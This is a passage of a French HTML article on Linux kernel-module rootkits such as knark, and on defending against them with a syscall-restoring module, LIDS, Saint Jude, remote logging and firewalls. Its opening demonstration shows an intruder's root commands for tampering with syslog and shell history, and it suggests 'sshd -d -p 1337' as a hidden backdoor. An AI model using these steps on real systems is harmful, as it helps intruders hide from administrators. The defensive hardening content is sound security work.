+# "<FONT color=#33ccff>who</FONT>" n'affichera plus l'utilsateur sauron. 
+<BR>sh-2.04# vi /etc/syslog.conf <BR>sh-2.04# kill -SIGHUP `cat 
+/var/run/syslogd.pid`&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Le pirate ajuste le logging a son gout sans changer le pid de syslog ! 
+<BR>sh-2.04# vi 
+/root/.bash_history&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# l'exploration de votre systeme et de vos habitude peut commencer pour 
+lui.</FONT> 
+<P><FONT face=Verdana size=2>La démonstration est courte mais elle est parlante. 
+Une fois le système compromis il est désormais possible à un pirate de cacher 
+toute ses activités et de backdoorer votre système d'une manière très efficace. 
+Puisqu'il peut passer des commandes sur votre système de manière non détectable, 
+rien ne l'empeche de lancer un <FONT color=#33ccff>sshd -d -p 1337</FONT><FONT 
+color=#ffffff> afin d'ouvrir une session ssh pour une seule connexion. Il est 
+probable que le système est été modifié pour ne plus loger ses activités 
+:-/</FONT> <BR>Nous allons voir comment mettre la puissance des modules kernel 
+de notre côté et comment parer ce type d'attaque. Le but étant de ne pas le 
+laisser devenir root, et même si c'est le cas, ne pas le laisser activer une 
+rootkit.</FONT>
+<P><FONT face=Verdana size=2>Le seul moyen de détecter ce pirate, serait de 
+réduire à néant l'effet de knark, puis de lister les terminaux ouverts en 
+regardant quelle uid est attribuée. Si un shell est lancé sous un nom 
+d'utilisateur qui n'apparaît pas avec la commande <FONT 
+color=#33ccff>who</FONT>, alors cela signifie que lastlog a été nettoyé. Par 
+ailleurs la présence d'un /bin/sh en root vous avertira !</FONT>
+<P><FONT face=Verdana size=2>Afin qu'aucun pirate ne fasse la même chose chez 
+vous, il vous faut comprendre comment marche les rootkits modules. Les rootkits 
+modules une fois chargés vont aller modifier la table des appels système et 
+faire pointer certains syscall vers de nouvelles fonctions implémentées. Ces 
+syscall sont par exemple sys_read pour empêcher de voir certaines chaînes de 
+caractères dans un fichier (un utilisateur supplémentaire dans /etc/passwd par 
+exemple), sys_getuid pour donner des droits root à un utilisateur qui ne l'est 
+pas, etc. Vous aurez compris que l'on peut détourner ces fonctions directement 
+liées au kernel, qui vont influer sur tous les binaires du système qui les 
+appelleront, sans que l'on ait à les modifier. Cela permet donc de contourner 
+tout les outils de sécurité qui se contentent de faire une empreinte du 
+filesystem comme <A href="http://www.tripwire.org/">Tripwire</A> ou <A 
+href="http://www.cs.tut.fi/~rammer/aide.html">AIDE</A>.</FONT> 
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT> Empêcher les outils 
+des pirates de fonctionner <FONT color=#33ccff>-]</FONT> </FONT>
+<P><FONT face=Verdana size=2>Afin d'éviter que des modules de rootkit soit 
+efficace, j'ai programmé un module qui va créer un nouvel appel système. Celui 
+ci lorsqu'on l'appelle remet la sys_call_table dans l'état ou il l'a trouver 
+lorsqu'il a été chargée de la même manière qu'un système de fichiers journalisé 
+le ferait pour des données ;). En l'insérant a un moment ou le système est sain, 
+vous vous assurez une parade efficace contre les rootkit comme knark, adore, 
+etc. Si en plus vous ajoutez le programme appelant le syscall dans vos scripts 
+cron, alors vous n'avez plus redouter les rootkits ou du moins les détournements 
+de syscall. <BR>Un pirate pourrait parer cette protection de 2 manière : en 
+rechargeant un module qui modifierai le syscall ajouté (ce qui nécessiterai que 
+votre pirate maîtrise la programmation de modules kernel, vous n'avez donc pas 
+affaire à un débutant), c'est pour cela que je vous conseille de choisir un 
+numéro à la compilation. Le pirate pourrait, après avoir recharger un module, 
+modifier en exécution le programme qui est dans vos scripts cron et qui appelle 
+mon module. Je pense que la meilleur méthode pour empêcher un pirate de charger 
+son module est de rediriger l'exécution de /sbin/insmod vers un binaire qui sera 
+identique mais qui fera appel à mon module immédiatement après. De cette 
+manière, à chaque fois qu'un module est chargé, la sys_call_table sera remise en 
+état au cas où il s'agirait d'un module backdoor. Votre pirate aura beau 
+compiler et insérer son module rien ne se passera.</FONT>
+<P><FONT face=Verdana size=2>Les rootkit des pirates trimballent avec elles 
+quelques outils tout à fait intéressants. Je pense par exemple à la redirection 
+en exécution de fichier. Cela peut offrir une bonne parade à des rootkit comme 
+t0rn qui se contente de modifier les binaires systèmes par&nbsp; des binaires 
+backdoorisées. Voila ce que je propose : créer un répertoire et y placer une 
+copie des binaires que des rootkit sont susceptibles de modifier (ls, ps, du, 
+netstat, find, etc.). Maintenant rediriger /bin/ps sur /root/backup/ps, /bin/ls 
+sur /root/backup/ls et ainsi de suite pour tout les binaires que vous avez 
+choisis de sauvegarder. En faisant ca, les rootkit comme t0rn qui remplaceront 
+vos binaires n'auront aucun effet puisqu'en réalité ils ne seront jamais 
+exécuter. Le module pour la redirection de sortie est disponible avec knark, il 
+est nommer rexec.c. Knark ainsi qu'une large collection de backdoors et rootkits 
+sont disponibles sur <A 
+href="http://ouah.bsdjeunz.org/programmes2.htm">OUAH</A>.</FONT> 
+<P><FONT face=Verdana size=2>Vous pouvez aussi allez vous même volontairement 
+modifier des syscall via un module. Cela peut être intéressant pour patcher 
+sys_symlink, pour vérifier qu'aucun fichier root n'est en train d'être linker 
+par un simple utilisateur, auquel cas il faut l'interdire. Cela aura pour effet 
+de réduire à néant les chances d'exploiter une faille dûe à la création 
+prévisible d'un fichier par un processus root :-) ( Pour l'exploiter il suffit à 
+un simple utilisateur de linker un fichier root avec un fichier inexistant qui 
+sera écrit par un processus root, pour profiter des droit root du processus qui 
+écrira son fichier et écrasera celui vers lequel le lien a été créé. cela permet 
+par exemple d'effacer la configuration de <A 
+href="ftp://ftp.porcupine.org/pub/security/index.html#software">TCP Wrapper</A> 
+dans /etc/hosts.deny. Une chose qui est certaine, c'est que le pirate essayera 
+d'effacer son IP des log. Pour ce faire, il utilisera un programme qui 
+s'occupera de la rechercher et d'effacer les lignes citant son IP dans les 
+fichiers /var/log. Bien souvent, modifier la configuration de syslogd dans 
+/etc/syslogd.conf suffit à empêcher votre pirate d'effacer ses logs. Je pense 
+que un loger supplémentaire en plus de syslogd n'est pas de trop. Cachez 
+celui-ci par un module ou bien donnez lui un nom anodin (i.e : lpd) pour ne pas 
+que le pirate se mefie et cherche à retirer son IP de ces fichiers logs ci 
+également. Il restera l'éventualité que le pirate recherche son IP sur 
+l'ensemble du système mais il y perdrait en efficacité. Enfin, gardez le duo <A 
+href="http://www.tcpdump.org/">libpcap/tcpdump</A> sous la main, et lancez le en 
+cas de doute, il n'y a pas de meilleur loger :-)</FONT>
+<P><FONT face=Verdana size=2>Je pense qu'un firewall n'est pas de trop, ne 
+serait-ce que pour empêcher n'importe qui de scanner votre réseau. Et si vous 
+êtes paranoïaque, vous pouvez même installer scanlogd, une alternative à syslogd 
+qui utilise les avantages de libpcap et libnids afin de détecter des scan 
+furtifs puis de tout enregistrer. Dans un style similaire on trouve <A 
+href="http://www.psionic.com/abacus/portsentry/">Port Sentry</A>, partie 
+intégrante du projet Abacus qui permet de repérer et de stopper toutes 
+tentatives de scanning et ce de manière automatisée. Je vous conseille vivement 
+d'opter pour <A href="http://www.openssh.org/">OpenSSH</A> si vous utilisez 
+telnet. Pour des besoins plus personnalisés, je vous conseille d'utiliser <A 
+href="http://www.stunnel.org/">Stunnel</A> qui vous permet d'établir des 
+connexions basée sur du tunneling SSL similaire à <A 
+href="http://www.openssl.org/">OpenSSL</A> :-). Faite un <FONT color=#33ccff>man 
+ipchains</FONT> pour en savoir plus sur la mise en place d'un firewall ou si 
+vous êtes en 2.4.* <FONT color=#33ccff>man netfilter</FONT> pour profiter des <A 
+href="http://netfilter.samba.org/FAQ/fr/netfilter-faq.html">dernières progrès en 
+firewall</A> comme le statefull. Tout ceci représente un temps d'administration 
+et de configuration relativement important mais ce sera autant de données ou de 
+machines non compromises ou de procédures judiciaires ou techniques en moins 
+dans l'avenir.</FONT>
+<P><FONT face=Verdana size=2>Le choix du supports des logs est très important. 
+Si vous loggez tout dans /var/log comme configurer par default, vous pouvez être 
+certain qu'un utilisateur une fois root corrompra ces logs. Pour vous assurer 
+que vos logs contiennent bien toutes les activité qu'il se doit d'enregistrer, 
+je vous conseille de tout enregistrer sur une machine distante. Seul le 
+processus actif aura permission d'accès en écriture et uniquement lui, pas même 
+le root. Votre pirate ne pourra ainsi pas effacer totalement ses traces des 
+logs, et cela le dissuadera d'entreprendre toute action néfaste à votre 
+encontre. Vous pouvez également les faire imprimer cependant attention à la 
+quantité énorme de log qui est chaque jour enregistrée par une machine de 
+production ou pire un serveur. Si vous voulez gagner de la place dans vos logs, 
+je vous conseille d'associer ipchains à un détecteur de scan. <BR><FONT 
+color=#33ccff>/sbin/ipchains -I input -s &lt;IpPirates&gt; -j DENY -l 
+</FONT><FONT color=#ffffff>vous permettra d'empêcher le pirate de mener à bout 
+son attaque après vous avoir scanné (également applicable avec l'utilisation de 
+Port Sentry cité plus haut).</FONT> </FONT>
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT> Ne pas donner 
+d'information à l'attaquant <FONT color=#33ccff>-]</FONT> </FONT>
+<P><FONT face=Verdana size=2>Les modules peuvent nous rendre bien des services 
+dans le domaine de la sécurité, par exemple il existe des modules qui vont 
+modifier le comportement de votre pile TCP/IP et qui vont ainsi vous protéger du 
+TCP fingerprinting (détection distante de l'OS par prise d'empreinte en fonction 
+du comportement de la pile tcp/ip - c'est&nbsp; l'option<FONT color=#33ccff> 
+-O</FONT> du fameux <A href="http://www.insecure.org/nmap">nmap</A>). Votre 
+machine passerait donc par exemple pour une machine Windows au yeux de nmap. 
+Attention cependant aux modifications qui peuvent entraîner de nouvelles 
+vulnérabilités notamment sur les numéros de séquence et leur générations. 
+Actuellement les backdoors distribuées avec les nouvelles rootkits sont des 
+modules permettant des commandes distantes de manière discrète (utilisation de 
+covert channel), mais il est courant que des pirates "bind" un shell sur un 
+port, c'est-à-dire redirige les flux d'entrée/sortie d'un shell sur un port 
+ouvert pour l'occasion. Dans ce cas n'importe qui se connectant sur ce port peut 
+se retrouver avec un shell root sur votre machine. Un simple <FONT 
+color=#33ccff>ps -aux</FONT> avec un port scanning de votre réseau vous fixera. 
+<FONT color=#ffffff>Je vous conseille également de modifier /etc/issue, 
+/etc/issue.net et les messages d'invite des services que vous utilisez en 
+général.</FONT> </FONT>
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT><FONT color=#ffffff> 
+Quelques mots sur Saint Jude et LIDS </FONT><FONT color=#33ccff>-]</FONT> 
+</FONT>
+<P><FONT face=Verdana size=2>Dans cette section, je vais principalement parler 
+de 2 choses : le patch kernel LIDS et ses fonctionnalités et le module/patch <A 
+href="http://sourceforge.net/projects/stjude/">Saint Jude</A>. <BR>Les 2 
+associés peuvent fournir&nbsp; une méthode efficace pour vous protéger des 
+intrusions. Saint Jude est un module linux qui va empêcher toute tentative de 
+rootage. Saint Jude ne fait pas appel à une banque de donnée de signatures 
+d'intrusion et est donc en mesure de détecter toute tentative de compromission 
+de votre système sans qu'il soit nécessaire de mettre quoi que ce soit à jour. 
+Les tentatives de rootage, que ce soit en local ou&nbsp;en remote seront 
+détectée. Saint Jude va en pratique aller modifier les syscall de la même 
+manière que procéderait un module backdoor mais pour sécuriser le kernel cette 
+fois. Voici la liste des syscall qu'il modifie : <BR>- sys_clone <BR>- 
+sys_execve <BR>- sys_exit <BR>- sys_fork <BR>- sys_setreuid <BR>- sys_setuid 
+<BR>Saint Jude inclut également un module de redirection d'exécution comme 
+décrit plus haut :) <BR>Il offre quelques fonctionnalités bien sympathiques 
+comme le fait de pouvoir afficher un message au pirate qui tenterai de 
+compromettre votre système ( "stop to hack my system - the sysadmin " par 
+default ;). Je ne vais pas m'étendre sur Saint Jude mais il est particulièrement 
+efficace et je le recommande à tout administrateur.&nbsp;</FONT>
+<P><FONT face=Verdana size=2>LIDS quand à lui permet de protéger des fichiers ou 
+des processus de votre système même du root qui normalement a un accès total au 
+système. En associant LIDS pour qu'il protége le module de Saint Jude, vous vous 
+assurez une efficace protection. Le code source de Saint Jude est 
+particulièrement intéressant si les modules kernel Linux vous intéressent, de 
+plus il fonctionne sur quasiment tout <BR>les noyaux linux actuellement 
+disponibles.N'ouibliez pas d'installer le patch fourni avec Saint Jude (il 
+modifie uniquement /usr/src/linux/kernel/ksyms.c) cela vous évitera de 
+recompiler par 2 fois votre noyau (car LIDS nécessite également la recompilation 
+du kernel).</FONT>
+<P><FONT face=Verdana size=2>LIDS est un système de détection d'intrusion et de 
+prévention qui réside directement dans le kernel linux. LIDS va prévenir toute 
+modification des fichiers se trouvant dans sa configuration et qualifiés comme 
+"sensibles" et autoriser les accès uniquement en lecture. LIDS inclue d'autre 
+protections outre celle des fichiers, comme par exemple la protection contre les 
+accès directs en mémoire ou contre les accès raw disk. LIDS va aussi empêcher 
+l'installation d'un sniffer ou encore la modification des règles du firewall. Il 
+propose de générer un password crypté avec RipeMD-160 et qui sera ensuite 
+installer dans le kernel. L'installation de LIDS est extrêmement simple et ce 
+fait sans aucun problème : <BR><FONT color=#33ccff>./lidsad -P</FONT> va d'abord 
+vous permettre de générer un password. Puis il vous faut compiler le fichier de 
+configuration standard pour votre architecture dans /usr/src/linux. Le patch 
+s'installe comme suit :</FONT> 
+<P><FONT face="Courier New" 
+size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cd 
+/usr/src <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+patch -p0 &lt;/root/IDS/lids-0.9/lids-0.9-2.2.14-redhat.patch</FONT> 
+<P><FONT face=Verdana size=2>LIDS contient pas mal de driver updatés, à en juger 
+par la quantité de sources du kernel qu'il va modifier :) Finalement, j'ai 
+configuré, compilé et installé le kernel :</FONT> 
+<P><FONT face="Courier New" 
+size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cd 
+/usr/src/linux 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; make 
+menuconfig 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; make dep; 
+make clean 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; make 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; install; 
+make modules; make modules_install</FONT> 
+<P><FONT face=Verdana size=2>Voila le menu que LIDS a ajouté et que vous verrez 
+désormais dans la configuration du kernel :</FONT> 
+<P><FONT face="Courier New" 
+size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] 
+Linux Intrusion Detection System support (EXPERIMENTAL) 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --- LIDS 
+features <BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+[ ] Hang up console when raising a securit alert 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] 
+Security alert when execing unprotected programs before sealing 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Do 
+not execute unprotected programs before sealing LIDS 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] 
+Enable init children lock feature 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Try 
+not to flood logs 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (60) 
+Authorised time between two identic logs (seconds) 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Allow 
+switching LIDS protections 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+RipeMD-160 encrypted password: d502d92bfead11d1ef17887c9db07a78108859e8 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (3) 
+Number of attempts to submit password 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; (3) Time 
+to wait after a fail (seconds) 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Allow 
+remote users to switch LIDS protections 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Allow 
+any program to switch LIDS protections 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Allow 
+reloading config. file 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Hide 
+some known processes 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Port 
+Scanner Detector in kernel 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Send 
+security alerts through network 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --- 
+Special authorizations 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Allow 
+some known processes to access /dev/mem (xfree, etc.) 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Allow 
+some known processes to access raw disk devices 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Allow 
+some known processes to access io ports 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [ ] Allow 
+some known processes to change routes 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; --- 
+Special UPS 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Allow 
+some known processes to unmount devices 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Allowed 
+processes: "/etc/rc.d/init.d/halt;/etc/rc.d/init.d/netfs" 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] 
+Unmounting capability is inherited 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] Allow 
+some known processes to kill init children 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; Allowed 
+processes: "/etc/rc.d/init.d/halt" 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [*] 
+Killing capability is inherited</FONT> 
+<P><FONT face=Verdana size=2>Avec un make menuconfig, ou make xconfig tout est 
+plus clair :) Regardez les options et activez celle qui vous intéresse. Vous 
+n'avez plus qu'a updater le kernel (/etc/lilo.conf puis rebootez). Voila votre 
+kernel est désormais patché !</FONT>
+<P><FONT face=Verdana size=2><FONT color=#ff6666>Attention ! </FONT>: Après 
+avoir installé LIDS, vous devez le configurer avant le prochain rebootage ! LIDS 
+stocke sa configuration dans /etc/lids.conf. Ce fichier ne devant jamais être 
+édité pour des raisons évidentes, vous devez utilisez le programme <BR>lidsadm. 
+<FONT color=#33ccff>./lidsadm -h</FONT> vous renseignera sur les option de LIDS. 
+Il m' a été nécessaire de modifier un tout petit peu la source de lidsadm.c pour 
+le compiler :</FONT> 
+<P><FONT face="Courier New" size=2>[root@localhost lidsadm-0.9]# make <BR>gcc 
+-static -O2&nbsp; -o lidsadm lidsadm.o rmd160.o sig_rmd160.o read_pw.o 
+<BR>lidsadm.o: In function `lids_update': <BR>lidsadm.o(.text+0xd25): undefined 
+reference to `MINOR' <BR>lidsadm.o(.text+0xd35): undefined reference to `MAJOR' 
+<BR>lidsadm.o(.text+0xd4f): undefined reference to `MINOR' 
+<BR>lidsadm.o(.text+0xd62): undefined reference to `MAJOR' <BR>[root@localhost 
+lidsadm-0.9]# vi lidsadm.c <BR>[root@localhost lidsadm-0.9]# make <BR>gcc 
+-O2&nbsp;&nbsp; -c -o lidsadm.o lidsadm.c <BR>gcc -static -O2&nbsp; -o lidsadm 
+lidsadm.o rmd160.o sig_rmd160.o read_pw.o <BR>[root@localhost 
+lidsadm-0.9]#</FONT> 
+<P><FONT face=Verdana size=2>Voici un exemple :</FONT> 
+<P><FONT face="Courier New" size=2>lidsadm -A -r 
+/sbin&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; # 
+Désormais le répertoire /Sbin est protégé en écriture :)</FONT> 
+<P><FONT face=Verdana size=2>Je vous recommande de protéger vos pages d'accueil 
+- si vous stockez des pages web bien sûr - de la même manière, et pourquoi pas 
+vos binaires système :</FONT> 
+<P><FONT face="Courier New" 
+size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+lidsadm -Z 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /usr/bin 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /bin 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /usr/sbin 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /sbin 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /usr/X11R6/bin 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r 
+/etc/rc.d&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Important pour ne pas activer de backdoor au demarrage ! 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /etc/sysconfig 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; lidsadm 
+-A -r /lib/modules/"kernel_version" # pour ne pas activer de module rootkit au 
+demarrage 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+# Mais pensez a y placer le mien avant d'appeler lidsadm !</FONT>
+<P><FONT face=Verdana size=2>Voila la commande pour activer LIDS dans le kernel. 
+Vous pouvez ajouter des options et je vous recommende fortement de le faire pour 
+atteindre un niveau de sécurité optimale. Vous ne devriez pas le lancer 
+simplement dans rc.local comme il est conseillé avec LIDS.</FONT> 
+<P><FONT face="Courier New" size=2>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+/sbin/lidsadm -I -- -CAP_SYS_MODULE -CAP_SYS_RAWIO -CAP_SYS_ADMIN \ 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
+-CAP_SYS_PTRACE -CAP_NET_ADMIN -CAP_LINUX_IMMUTABLE \ 
+<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 
++INIT_CHILDREN_LOCK</FONT> 
+<P><FONT face=Verdana size=2>Et voila ! Je vous laisse paramètrer LIDS comme bon 
+vous semble ! Maintenant voyons si il est réellement efficace :</FONT>
+<P><FONT face=Verdana size=2><FONT color=#33ccff>[-</FONT> Récapitulons les 
+principales démarches à suivre pour ne pas craindre les pirates<FONT 
+color=#33ccff> -]</FONT> </FONT>
+<P><FONT face=Verdana size=2><FONT color=#33ccff>1-</FONT> Identifiez et 
+désactivez les services vulnérables, et retirez les droits root en exécution aux 
+binaires du système dont vous savez qu'elles sont vulnérables (attention la 
+glibc comporte également des failles et il peut être nécessaire de l'updater). 
+Ne laissez tourner sur votre machine QUE les services dont vous avez besoin et 
+ceux là correctement patchés. <BR><FONT color=#33ccff>2-</FONT> Insérez mon 
+module en mémoire et mettez le programme qui y fait appelle dans vos scripts 
+cron (ou pensez à le lancer de temps à autres). <BR><FONT 
+color=#33ccff>3-</FONT> Faites une copie de vos binaires système susceptibles 
+d'être modifiés, et redirigez l'exécution des originaux vers l'endroit ou vous 
+stockerez ceux-ci. <BR><FONT color=#33ccff>4-</FONT> Changer le répertoire et 
+fichier de log de syslogd dans /etc/syslogd.conf <BR><FONT 
+color=#33ccff>5-</FONT> Faites effectuer à cron une vérification à la recherche 
+de nouveau fichier root dans le répertoire /home de vos utilisateurs simples. 
+<BR><FONT color=#33ccff>6-</FONT> Optionnellement, installez un détecteur de 
+scanner ou encore un sniffer comme alternative ou complément à syslogd. 
+<BR><FONT color=#33ccff>7-</FONT> Optionnellement, installez un Network IDS 
+(Intrusion detection System) comme <A href="http://www.snort.org/">Snort</A> ne 
+peut pas faire de mal. Et à l'avenir gardez un oeil sur <A 
+href="http://tritheme.sourceforge.net/">Trithème</A> ;) <BR><FONT 
+color=#33ccff>8-</FONT> Ajoutez un script à cron qui s'occupera de la 
+fastidieuse analyse des fichiers de log à votre place pour y détecter des 
+empreintes typique d'intrusion (certain scan peuvent aussi être détecter grâce à 
+syslog, mais ce n'est pas le cas de tout les scans furtifs). Ce type d'outils 
+est téléchargeable un peu partout (jetez un oeil sur <A 
+href="http://sourceforge.net/projects/logreport/">LogReport</A>). <BR><FONT 
+color=#33ccff>9-</FONT> Pourquoi ne pas remplacer votre telnet par un sshd ou 
+votre http par un https ? Ces protocoles sont connus et supportés très largement 
+et il&nbsp; vous protège de bien des attaques. Si un sniffer est installé sur 
+votre réseau, seul un hacker expérimenté pourra continuer à sniffer les 
+connexions crypter via ssh par des attaques man-in-the-middle par exemple. Et 
+pour le service https, celui ci est vital si vous utilisez des CGI sur un 
+serveur web. Il limitera la possibilité de faire des scans de CGI (des outils 
+plus évolués existent cependant mais sont peu diffusés). <BR><FONT 
+color=#33ccff>10-</FONT> Vérifiez que les processus avec lesquels des pirates 
+potentiels peuvent interagir ne tournent pas en root ! Si c'est le cas et que ce 
